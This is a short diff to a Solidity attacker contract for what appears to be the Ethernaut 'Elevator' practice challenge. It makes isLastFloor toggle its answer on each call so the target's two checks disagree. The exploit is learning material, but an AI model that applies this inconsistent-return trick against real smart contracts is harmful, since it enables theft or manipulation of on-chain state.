@@ -6,8 +6,11 @@ abstract contract Elevator {
 }
 
 contract Attacker11 {
-    function isLastFloor(uint256) external pure returns (bool) {
-        return true;
+    bool lastValue = true;
+
+    function isLastFloor(uint256) external returns (bool) {
+        lastValue = !lastValue;
+        return lastValue;
     }
 
     function attack(address targetAddr, uint256 _floor) external {
